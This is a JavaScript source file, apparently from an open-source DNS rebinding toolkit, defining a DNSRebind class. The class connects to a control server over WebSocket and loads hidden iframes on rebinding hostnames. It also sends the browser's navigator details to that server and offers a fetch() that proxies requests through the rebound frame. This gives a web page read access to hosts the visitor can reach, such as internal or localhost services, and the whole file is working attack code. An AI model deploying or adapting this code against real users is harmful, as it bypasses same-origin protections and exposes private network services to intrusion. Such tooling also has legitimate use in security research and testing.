/*
 * Copyright 2017 LinkedIn Corporation. All rights reserved. Licensed under the BSD-2 Clause license.
 * See LICENSE in the project root for license information.
 */

// Class representing a DNS rebinding helper
class DNSRebind {

	constructor(base) {
		// Default to the host provided by currentScript if none provided
		base = base || DNSRebind.base
		// Hosts is a mapping from host => subdomain
		this._requestPromises = {};
		this._hosts = {};
		this._hostsPromises = {};
		this._ws = new Promise((resolve, reject) => {
			let ws = new WebSocket(`ws://${base}/v1.websocket`);
			ws.onopen = () => {
				resolve(ws);
			};
			ws.onerror = (e) => reject(e);
			ws.onmessage = (e) => {
				let results = JSON.parse(e.data);
				this._hostsPromises[results.requestId].resolve(results);
			}
			return ws;
		});
	}

	// _createFrame will create an iframe to a given URL
	_createFrame(offer) {
		// Create the invisible frame
		let frame = document.createElement("iframe");
		frame.style.display = 'none';
		frame.src = offer.url;
		frame.id = offer.id;
		// Return a promise to add the frame and communicate with it
		return new Promise((resolve, reject) => {
			// Once the frame loads try to send a hello
			frame.onload = () => resolve(frame);
			frame.onerror = () => reject(frame);
			// Trigger the chain by adding to the DOM
			document.body.appendChild(frame);
		});
	}

	// createMessageChannel returns a promise to create a message channel given a frame
	_createMessageChannel(frame) {
		return new Promise((resolve, reject) => {
			// Open a channel to avoid global listener shenanigans 
			let channel = new MessageChannel();
			// If we get an ACK back, resolve the promise
			channel.port1.onmessage = (e) => {
				// If we get something other than an ACK, reject
				if (e.data != "ACK") {
					reject("Unknown data");
				} else {
					resolve({frame, channel});
				}
			}
			// Send our SYN
			// TODO: remove insecure *?
			frame.contentWindow.postMessage("SYN", "*", [channel.port2]);
		}).catch((e) => {
			// Remove the frame from the DOM (cleanup)
			frame.parentNode.removeChild(frame);
			// Bubble up the rejected promise
			return Promise.reject(e);
		});
	}

	// _getChannel will try to open a channel via multiple urls
	_getChannel(offers) {
		// Create an array of frames for each URL
		let framePromises = offers.map((offer) => this._createFrame(offer));
		// Create an array of message channels for each frame
		let messageChannelPromises = framePromises.map((framePromise) => {
			// Wait for a rebind to occur
			return framePromise.then((frame) => this._createMessageChannel(frame));
		});
		// Create an array of promises to create a channel
		// Invert the resolve/reject so we can use Promise.all to get the first success
		return Promise.all(messageChannelPromises.map((p) => {
			return p.then(val => Promise.reject(val), err => Promise.resolve(err));
		// Invert back after the Promise.all resolves
		})).then(errs => Promise.reject(errs), vals => Promise.resolve(vals)).then((channel) => {
			// Cleanup any other frames that resolve
			framePromises.forEach((framePromise) => {
				framePromise.then((frame) => {
					if (frame != channel.frame) {
						frame.parentNode.removeChild(frame);
					}
				});
			});
			return channel;
		}).then((channel) => {
			channel.channel.port1.onmessage = (e) => {
				// If the page is letting us know that it cached, save in localStorage
				/*if (e.data == "CACHED") {
					if (!localStorage.cached) {
						localStorage.cached = "";
					}
					localStorage.cached += "," + new URL(channel.frame.src).host
					return;
				}*/
				Object.keys(e.data).forEach((id) => {
					let resp = e.data[id];
					if (resp.resolve) {
						this._requestPromises[id].resolve(new Response(resp.resolve.blob));
					} else {
						this._requestPromises[id].reject(resp.resolve);
					}
				});
			}
			return channel.channel;
		});
	}

	// _getHost get a channel for a given host, or creates one if it doesn't already exist
	_getHost(host) {
		if (!this._hosts[host]) {
			this._hosts[host] = this._ws.then((ws) => {
				// Clone window.navigator and serialize it, server can use it to make decisions about which rebinds to try
				let navigator = {};
				for (var i in window.navigator) {
					navigator[i] = window.navigator[i];
				}
				let requestId = this._UUID();
				ws.send(JSON.stringify({
					requestId: requestId,
					action: "host",
					navigator: navigator,
					host: host,
//					cached: ((localStorage || {}).cached || "").split(",").splice(1),
				}));
				return new Promise((resolve, reject) => {
					this._hostsPromises[requestId] = {resolve, reject};
				}).then((resp) => this._getChannel(resp.offers));
			});
		}
		return this._hosts[host];
	}

	// _UUID generates a UUID
	_UUID() {
		return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
		    var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
		    return v.toString(16);
		});
	}

	// Fetch a resource from the network (via DNS rebinding)
	fetch(input, init) {
		// Convert to a Request object
		init = init || {};
		let req = new Request(input, init);
		let url = new URL(req.url);
		let urlS = url.toString(); // If we cast to a string, much easier to operate on
		return this._getHost(url.host).then((channel) => {
			let id = this._UUID();
			return new Promise((resolve, reject) => {
				this._requestPromises[id] = {resolve, reject}
				channel.port1.postMessage({
					id: id,
					input: urlS,
					init: {
						method: req.method,
						body: init.body,
						mode: req.mode,
						//TODO: headers
						credentials: req.credentials,
						cache: req.cache,
						redirect: req.redirect,
						referrer: req.referrer,
						integrity: req.integrity,
					}
				});
			});
		});
	}

}

// Set the host based on the domain this script was loaded from
DNSRebind.base = new URL(document.currentScript.src).host
